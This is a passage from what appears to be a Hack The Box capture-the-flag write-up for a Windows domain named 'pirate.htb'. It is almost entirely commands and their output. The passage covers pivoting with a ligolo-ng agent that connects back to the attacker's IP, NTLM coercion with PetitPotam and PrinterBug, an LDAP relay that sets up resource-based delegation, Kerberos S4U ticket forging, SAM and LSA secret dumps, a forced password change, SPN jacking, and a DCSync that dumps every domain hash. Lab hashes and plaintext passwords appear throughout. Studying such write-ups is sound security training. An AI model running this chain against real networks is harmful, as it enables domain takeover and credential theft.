+Reply from 192.168.100.2: bytes=32 time&lt;1ms TTL=128</code></pre><p>Looks like there is another host</p><p>Ill get ligolo-ng setup to access the internal host</p><h2>Setting up ligolo-ng</h2><p><a href="https://github.com/nicocha30/ligolo-ng/releases" target="_blank" rel="noreferrer">https://github.com/nicocha30/ligolo-ng/releases</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Temp&gt; upload agent.exe .
+Uploading /home/kali/htb/pirate/agent.exe: 7.06MB [00:14, 503kB/s]                                           
+[+] File uploaded successfully as: C:\Temp\agent.exe
+evil-winrm-py PS C:\Temp&gt;</code></pre><p>Ill get the agent uploaded to the target</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo ./proxy -selfcert
+[sudo] password for kali: 
+INFO[0000] Loading configuration file ligolo-ng.yaml    
+WARN[0000] daemon configuration file not found. Creating a new one... 
+? Enable Ligolo-ng WebUI? No
+WARN[0001] Using default selfcert domain &#39;ligolo&#39;, beware of CTI, SOC and IoC! 
+ERRO[0001] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
+INFO[0001] Listening on 0.0.0.0:11601                   
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!
+  Version: 0.9.1
+
+ligolo-ng »</code></pre><p>ill start the proxy on my system</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py PS C:\Temp&gt; ./agent.exe -connect 10.10.14.61:11601 --ignore-cert --retry</code></pre><p>Ill then trigger a connection back to me</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ligolo-ng » session
+? Specify a session : 1 - PIRATE\gMSA_ADCS_prod$@DC01 - 10.129.244.95:59484 - 00155d0bd000
+[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » 
+[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » 
+[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » ifcreate --name ligolo
+INFO[0098] Creating a new ligolo interface...           
+INFO[0098] Interface created!                           
+[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » route_add --name ligolo --route 192.168.100.0/24
+INFO[0158] Route created.                               
+[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » tunnel_start 
+INFO[0166] Starting tunnel to PIRATE\gMSA_ADCS_prod$@DC01 (00155d0bd000) 
+[Agent : PIRATE\gMSA_ADCS_prod$@DC01] »</code></pre><p>ill then select the new session create the interface and add the new routing info, then start the tunnel</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb 192.168.100.0/24                                                            
+SMB         192.168.100.1   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         192.168.100.2   445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:None)
+Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00</code></pre><p>I now see the <code>web01</code> machine</p><h2>Enumeration of <code>web01</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=200 -vv web01.pirate.htb -Pn -sT
+
+Nmap scan report for web01.pirate.htb (192.168.100.2)
+Host is up, received user-set (0.020s latency).
+rDNS record for 192.168.100.2: web01
+Scanned at 2026-09-24 17:42:19 BST for 153s
+Not shown: 65522 filtered tcp ports (no-response)
+PORT      STATE SERVICE      REASON
+80/tcp    open  http         syn-ack
+135/tcp   open  msrpc        syn-ack
+139/tcp   open  netbios-ssn  syn-ack
+445/tcp   open  microsoft-ds syn-ack
+5985/tcp  open  wsman        syn-ack
+47001/tcp open  winrm        syn-ack
+49664/tcp open  unknown      syn-ack
+49665/tcp open  unknown      syn-ack
+49668/tcp open  unknown      syn-ack
+49672/tcp open  unknown      syn-ack
+49687/tcp open  unknown      syn-ack
+49706/tcp open  unknown      syn-ack
+49707/tcp open  unknown      syn-ack</code></pre><p>These are the open ports</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc winrm web01.pirate.htb -u &#39;gMSA_ADFS_prod$&#39; -H &#39;e819498ec29f595382df1eaf4fb42307&#39;
+WINRM       192.168.100.2   5985   WEB01            [*] Windows 10 / Server 2019 Build 17763 (name:WEB01) (domain:pirate.htb) 
+WINRM       192.168.100.2   5985   WEB01            [+] pirate.htb\gMSA_ADFS_prod$:e819498ec29f595382df1eaf4fb42307 (Pwn3d!)</code></pre><p>The ADFS service account can be used to winrm into the <code>web01</code> machine</p><h2>Access over WINRM on <code>web01</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py -i web01.pirate.htb -u &#39;gMSA_ADFS_prod$&#39; -H &#39;e819498ec29f595382df1eaf4fb42307&#39;
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | &#39; \| &#39;_| &#39;  |___| &#39;_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to &#39;web01.pirate.htb:5985&#39; as &#39;gMSA_ADFS_prod$&#39;
+evil-winrm-py PS C:\Users\gMSA_ADFS_prod$.PIRATE\Documents&gt; whoami
+pirate\gmsa_adfs_prod$
+evil-winrm-py PS C:\Users\gMSA_ADFS_prod$.PIRATE\Documents&gt;</code></pre><p>I can authenticate here as the ADFS account but not the ADCS account</p><h2>NTLMv1 coersion</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h nxc smb web01.pirate.htb -u &#39;ms01$&#39; -p &#39;ms01&#39; -k -M coerce_plus -o LISTENER=10.10.14.61
+SMB         web01.pirate.htb 445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:None)
+SMB         web01.pirate.htb 445    WEB01            [+] pirate.htb\ms01$:ms01 
+COERCE_PLUS web01.pirate.htb 445    WEB01            VULNERABLE, PetitPotam
+COERCE_PLUS web01.pirate.htb 445    WEB01            Exploit Success, efsrpc\EfsRpcAddUsersToFile
+COERCE_PLUS web01.pirate.htb 445    WEB01            VULNERABLE, PrinterBug
+COERCE_PLUS web01.pirate.htb 445    WEB01            Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
+COERCE_PLUS web01.pirate.htb 445    WEB01            VULNERABLE, MSEven</code></pre><p>Ill coerce auth from <code>web01$</code> back to me</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[SMB] NTLMv1-SSP Client   : 10.129.244.95
+[SMB] NTLMv1-SSP Username : PIRATE\WEB01$
+[SMB] NTLMv1-SSP Hash     : WEB01$::PIRATE:375E28CAB3025DE400000000000000000000000000000000:ACD8AAD51733BC893428BF25C3F6600CB316B18D516A3770:0c2f849c84700ef9</code></pre><p>Now this isnt really a hash, i can try to convert it with a tool then try to crack it, but this will take a long time</p><p>I think the better plan is to replace responder with a relay that executes a command</p><h2>Using relay to setup delegation</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc01.pirate.htb -d pirate.htb -u &#39;ms01$&#39; -p &#39;ms01&#39; -k add dnsRecord pwned 10.10.14.61
+Clock skew detected. Adjusting local time by 7:00:00.217305. Retrying operation.
+[+] pwned has been successfully added</code></pre><p>First ill add the DNS record to the domain controller, with my IP address</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc01.pirate.htb -d pirate.htb -u &#39;pentest&#39; -p &#39;p3nt3st2025!&amp;&#39; -k get dnsDump
+
+recordName: pwned.pirate.htb
+A: 10.10.14.61</code></pre><p>As seen here the record exists</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ntlmrelayx.py -t ldap://dc01.pirate.htb --delegate-access -smb2support                         
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Protocol Client RPC loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client WINRMS loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Setting up WinRM (HTTP) Server on port 5985
+[*] Setting up RPC Server on port 135
+[*] Setting up MSSQL Server on port 1433
+[*] Setting up WinRMS (HTTPS) Server on port 5986
+[*] Setting up RDP Server on port 3389
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections</code></pre><p>ill start the relay</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">coercer coerce -d pirate.htb --dc-ip 10.129.244.95 -u pentest -p &#39;p3nt3st2025!&amp;&#39; -t web01.pirate.htb -l pwned --auth-type http
+       ______
+      / ____/___  ___  _____________  _____
+     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
+    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
+    \____/\____/\___/_/   \___/\___/_/       by @podalirius_
+
+[info] Starting coerce mode
+[info] Scanning target web01.pirate.htb
+[*] DCERPC portmapper discovered ports: 49664,49665,49668,49672,49706,49707,49687
+[+] DCERPC port &#39;49687&#39; is accessible!
+   [+] Successful bind to interface (12345678-1234-ABCD-EF00-0123456789AB, 1.0)!
+[+] SMB named pipe &#39;\PIPE\efsrpc&#39; is accessible!
+   [+] Successful bind to interface (df1941c5-fe89-4e79-bf10-463657acf44d, 1.0)!
+      [+] (ERROR_BAD_NETPATH) MS-EFSR──&gt;EfsRpcAddUsersToFile(FileName=&#39;\\pwned@80/jA7\share\file.txt\x00&#39;) 
+Continue (C) | Skip this function (S) | Stop exploitation (X) ? C
+      [+] (ERROR_BAD_NETPATH) MS-EFSR──&gt;EfsRpcAddUsersToFileEx(FileName=&#39;\\pwned@80/muu\share\file.txt\x00&#39;)</code></pre><p>Ill then run coercer with the target, my added record and the auth type i need</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[*] Servers started, waiting for connections
+[*] (HTTP): Client requested path: /muu/pipe/srvsvc
+[*] (HTTP): Client requested path: /muu/pipe/srvsvc
+[*] (HTTP): Connection from 10.129.244.95 controlled, attacking target ldap://dc01.pirate.htb
+[*] (HTTP): Client requested path: /muu/pipe/srvsvc
+[*] (HTTP): Authenticating connection from PIRATE/WEB01$@10.129.244.95 against ldap://dc01.pirate.htb SUCCEED [1]
+[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -&gt; Enumerating relayed user&#39;s privileges. This may take a while on large domains
+[*] (HTTP): Client requested path: /muu/pipe/srvsvc
+[*] (HTTP): Client requested path: /muu/pipe/srvsvc
+[*] All targets processed!
+[*] (HTTP): Connection from 10.129.244.95 controlled, but there are no more targets left!
+[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -&gt; Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS
+[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -&gt; Attempting to create computer in: CN=Computers,DC=pirate,DC=htb
+[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -&gt; Adding new computer with username: GFSNAPOT$ and password: dmhA4CZ0Az7aVno result: OK
+[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -&gt; Delegation rights modified succesfully!
+[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -&gt; GFSNAPOT$ can now impersonate users on WEB01$ via S4U2Proxy</code></pre><p>The attack was completed</p><p>I can now use the added machine account to impersonate any user on <code>web01$</code> using RBCD</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h getST.py -spn &#39;cifs/web01.pirate.htb&#39; -impersonate Administrator pirate.htb/&#39;GFSNAPOT$&#39;:&#39;dmhA4CZ0Az7aVno&#39;
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_web01.pirate.htb@PIRATE.HTB.ccache</code></pre><p>I now have a ticket for the <code>web01$</code> administrator</p><h2>Administrator on <code>web01</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h nxc smb web01.pirate.htb -u Administrator --use-kcache
+SMB         web01.pirate.htb 445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:None)
+SMB         web01.pirate.htb 445    WEB01            [+] pirate.htb\Administrator from ccache (Pwn3d!)</code></pre><p>I am now the administrator on the <code>web01</code> machine</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h nxc smb web01.pirate.htb -u Administrator --use-kcache --sam 
+SMB         web01.pirate.htb 445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:None)
+SMB         web01.pirate.htb 445    WEB01            [+] pirate.htb\Administrator from ccache (Pwn3d!)
+SMB         web01.pirate.htb 445    WEB01            [*] Dumping SAM hashes
+SMB         web01.pirate.htb 445    WEB01            Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
+SMB         web01.pirate.htb 445    WEB01            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         web01.pirate.htb 445    WEB01            DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         web01.pirate.htb 445    WEB01            WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:60da2d3ba00d6b5932e4c87dce6fa6b4:::
+SMB         web01.pirate.htb 445    WEB01            [+] Added 4 SAM hashes to the database</code></pre><p>Ill then dump the SAM to get the admin hash</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py -i web01.pirate.htb -u Administrator -H &#39;b1aac1584c2ea8ed0a9429684e4fc3e5&#39;    
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | &#39; \| &#39;_| &#39;  |___| &#39;_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to &#39;web01.pirate.htb:5985&#39; as &#39;Administrator&#39;
+evil-winrm-py PS C:\Users\Administrator\Documents&gt;</code></pre><p>And now i can authenticate to the <code>web01</code> machine as the administrator</p><h2>Compromising <code>a.white</code> and <code>a.white_adm</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h nxc smb web01.pirate.htb -u Administrator --use-kcache --lsa
+SMB         web01.pirate.htb 445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:None)
+SMB         web01.pirate.htb 445    WEB01            [+] pirate.htb\Administrator from ccache (Pwn3d!)
+SMB         web01.pirate.htb 445    WEB01            [*] Dumping LSA secrets
+SMB         web01.pirate.htb 445    WEB01            PIRATE.HTB/Administrator:$DCC2$10240#Administrator#8baf09ddc5830ac4456ee8639dd89644: (2026-02-25 02:41:09)
+SMB         web01.pirate.htb 445    WEB01            PIRATE.HTB/gMSA_ADFS_prod$:$DCC2$10240#gMSA_ADFS_prod$#66812dfee46ff41c9c8245a2819c3183: (2026-09-24 22:29:34)
+SMB         web01.pirate.htb 445    WEB01            PIRATE.HTB/a.white:$DCC2$10240#a.white#366c8924be3ea6d1d12825569a4bcc39: (2026-09-24 22:27:25)
+SMB         web01.pirate.htb 445    WEB01            PIRATE\WEB01$:plain_password_hex:29f1505d87014b01b4317fed1d52ddbee2792a698e7e1de1bcdf29ab5d4b8e54828ce470d23491ba84e82d786622a821a14c730cf8610a32db1951b7619ee08c3bcacbab53aac8e052bd64e638c6bbd9529daacf04f86cfb9034808c4378d2c328c8c6afe7655f4a099dc41caeb6279c53313edcbd58db3e14490b7543ba3250ac200ec9834992b61b3f4319162645b50f402de4db0843fc43db7d54e04828abf86e490959bc88670e50f0b50373a3745f70039f8fd032435c4a725526957c7ae0dbaa81273b3aa28c0b029fea90c271b6601ef3ba7a05a13ec8c8ffd9999dd10eee87b4b9eb08a8a4af90710056f558
+SMB         web01.pirate.htb 445    WEB01            PIRATE\WEB01$:aad3b435b51404eeaad3b435b51404ee:feba09cf0013fbf5834f50def734bca9:::
+SMB         web01.pirate.htb 445    WEB01            PIRATE\a.white:E2nvAOKSz5Xz2MJu
+SMB         web01.pirate.htb 445    WEB01            dpapi_machinekey:0x01cffc2ef9a91d20107371f9a4a4112c892ed989
+dpapi_userkey:0xa4fddb1b2df2db7cc3d044dc1b559bc1b45a1de9
+SMB         web01.pirate.htb 445    WEB01            _SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:e3ef474b98138dd4469f6dc176f879ba1e0817ba44502187b9080b9f3334c91b9b1af1ce4e91fb562c8d8824412c700e00d105bc674d8e26a594e3da4173f2c87313d634b39c3412d4bfb6849247686df6065b536566807e0ace92f94ea3166bb9752d12d352c89b9fdafa7d3171e4dd55be9d585504f8c628a0ff4c670d7595a909a3c9a7ec2dff984e5ddf77049a91a5597f0a39c5499455675901cce41aded98d80a1b5f7f82cc220b590df4bfc0bfc5f0feb66e73a56f1ab7fe914c6d7cd2b83e0b9065b76e02bc330f7694416f3acd6c463df84923500b64a1014e74413809a7a06af577ce7685bfd2ab56a2067
+SMB         web01.pirate.htb 445    WEB01            _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:01000000220100001000000012011a01b6c4083911a28350b1fd6948803650e1b1c5741f7719b1f4ff926203dcdf4ec9c0369b7b92fe10a2d7ff953bfa406a3b6786523ed82767cc8fe2734af892e98efbef2b3476759032b4ecdef34276c363b8a9410b63d809ea6ef167f5b541d73c3ac4214da22a14d97982c928d91bb971fe99d4809c1ebdeae8e769c6b3377ee1a478dffbb2ddc13318be131167d1a4a01833a4c27e0512690d73de1e59a01761ec7d40fc1882050cbf439d9cbb281a06d4bf8d85d1feb2740ec399eca0e46e36990b72b2c4a64ae009bafb3dfd264ff734b63fb922609e8c305883a75d9aef75ce37bca0910436590d9312fca46ad89a61a89bddc873197de48eab3d69b9e49800001941b01b7317000019e3df6872170000
+SMB         web01.pirate.htb 445    WEB01            GMSA ID: a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11 NTLM: 841fae962662f0c2f0178d01d178ec3e
+SMB         web01.pirate.htb 445    WEB01            [+] Dumped 9 LSA secrets to /home/kali/.nxc/logs/lsa/WEB01_web01.pirate.htb_2026-09-25_031007.secrets and /home/kali/.nxc/logs/lsa/WEB01_web01.pirate.htb_2026-09-25_031007.cached</code></pre><p>I can also dump LSA, i have now got <code>a.white</code> password</p><p><img src="images/pirate/pasted-image-20260924201154.webp" alt="Screenshot" loading="lazy" /></p><p>This user i have now got has ForceChangePassword on the <code>adm</code> account</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc01.pirate.htb -d pirate.htb -u &#39;a.white&#39; -p &#39;E2nvAOKSz5Xz2MJu&#39; set password &#39;a.white_adm&#39; &#39;Password123!&#39;
+[+] Password changed successfully!</code></pre><p>The accounts password has now been changed</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.pirate.htb -u a.white_adm -p &#39;Password123!&#39;
+SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.95   445    DC01             [+] pirate.htb\a.white_adm:Password123!</code></pre><p>This user is now compromised!</p><h2>SPN jacking and constrained delegation</h2><p><a href="https://www.thehacker.recipes/ad/movement/kerberos/spn-jacking" target="_blank" rel="noreferrer">https://www.thehacker.recipes/ad/movement/kerberos/spn-jacking</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">findDelegation.py pirate.htb/&#39;a.white_adm&#39;:&#39;Password123!&#39;                                   
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+AccountName  AccountType  DelegationType                      DelegationRightsTo     SPN Exists 
+-----------  -----------  ----------------------------------  ---------------------  ----------
+DC01$        Computer     Unconstrained                       N/A                    Yes        
+a.white_adm  Person       Constrained w/ Protocol Transition  http/WEB01.pirate.htb  Yes        
+a.white_adm  Person       Constrained w/ Protocol Transition  HTTP/WEB01             Yes        
+GFSNAPOT$    Computer     Resource-Based Constrained          WEB01$                 No         </code></pre><p>Im only interested in the delegation rights of <code>a.white_adm</code></p><p>In this case its on <code>web01</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc01.pirate.htb -d pirate.htb -u &#39;a.white_adm&#39; -p &#39;Password123!&#39; get writable --detail
+
+distinguishedName: CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
+servicePrincipalName: WRITE
+
+distinguishedName: CN=WEB01,CN=Computers,DC=pirate,DC=htb
+servicePrincipalName: WRITE</code></pre><p>This means i can essentially move the SPN from one machine to the other, i want <code>dc01</code> in this situation since i have already compromised <code>web01</code></p><p><a href="https://github.com/dirkjanm/krbrelayx" target="_blank" rel="noreferrer">https://github.com/dirkjanm/krbrelayx</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 addspn.py --clear -t &#39;web01$&#39; -u &#39;pirate.htb\a.white_adm&#39; -p &#39;Password123!&#39; &#39;10.129.244.95&#39;
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[+] Printing object before clearing
+DN: CN=WEB01,CN=Computers,DC=pirate,DC=htb - STATUS: Read - READ TIME: 2026-09-24T20:27:12.221378
+    dNSHostName: WEB01.pirate.htb
+    sAMAccountName: WEB01$
+    servicePrincipalName: tapinego/WEB01
+                          tapinego/WEB01.pirate.htb
+                          WSMAN/WEB01
+                          WSMAN/WEB01.pirate.htb
+                          HOST/WEB01.pirate.htb
+                          RestrictedKrbHost/WEB01.pirate.htb
+                          HOST/WEB01
+                          RestrictedKrbHost/WEB01
+                          TERMSRV/WEB01.pirate.htb
+                          TERMSRV/WEB01
+                          HTTP/WEB01
+                          HTTP/WEB01.pirate.htb
+
+[+] SPN Modified successfully</code></pre><p>Ill first clear the SPNs</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 addspn.py -t &#39;dc01$&#39; --spn &#39;HTTP/WEB01.pirate.htb&#39; -u &#39;pirate.htb\a.white_adm&#39; -p &#39;Password123!&#39; &#39;10.129.244.95&#39;
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[+] SPN Modified successfully</code></pre><p>Then ill add the SPN for the DC</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h getST.py -spn &quot;HTTP/WEB01.pirate.htb&quot; -impersonate &quot;Administrator&quot; &#39;pirate.htb/a.white_adm:Password123!&#39; -altservice &quot;cifs/DC01.pirate.htb&quot; -k
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to cifs/DC01.pirate.htb@PIRATE.HTB
+[*] Saving ticket in Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache</code></pre><p>Ill then just request a TGT for the Administrator</p><h2>Domain Admin</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +7h secretsdump.py -k -no-pass dc01.pirate.htb
+
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:598295e78bd72d66f837997baf715171:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+[*] DefaultPassword 
+PIRATE\Administrator:gODNiUG69Mz77SIZ
+
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:598295e78bd72d66f837997baf715171:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:33071738496aba54a991ccc80875c97e:::
+pirate.htb\a.white_adm:1104:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+pirate.htb\a.white:3101:aad3b435b51404eeaad3b435b51404ee:d2593a013aaf8e077ab0e69f9471b4c1:::
+pirate.htb\pentest:4106:aad3b435b51404eeaad3b435b51404ee:32e1d98aef1071b86d5132f6bb18f3fa:::
+pirate.htb\j.sparrow:4110:aad3b435b51404eeaad3b435b51404ee:cfea2c42c4e9e5a1ac6b7ed4b9a9f518:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:230600b8b669ffa1dccf403058170dae:::
+WEB01$:3102:aad3b435b51404eeaad3b435b51404ee:feba09cf0013fbf5834f50def734bca9:::
+MS01$:4102:aad3b435b51404eeaad3b435b51404ee:b80b20b63597d94d0e5c95d119a11c60:::
+EXCH01$:4103:aad3b435b51404eeaad3b435b51404ee:bc74a7036b998a5e098615df5af3dfb8:::
+gMSA_ADCS_prod$:4105:aad3b435b51404eeaad3b435b51404ee:aa831d274ee80cf2092f68cbcf29093e:::
+gMSA_ADFS_prod$:4108:aad3b435b51404eeaad3b435b51404ee:e819498ec29f595382df1eaf4fb42307:::
+GFSNAPOT$:10601:aad3b435b51404eeaad3b435b51404ee:88ea2e8a287c9bbabd75a9354d754c0b:::</code></pre><p>I can now use the ticket to dump the secrets from the domain</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm-py -i dc01.pirate.htb -u Administrator -H &#39;598295e78bd72d66f837997baf715171&#39;
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | &#39; \| &#39;_| &#39;  |___| &#39;_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to &#39;dc01.pirate.htb:5985&#39; as &#39;Administrator&#39;
+evil-winrm-py PS C:\Users\Administrator\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State  
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
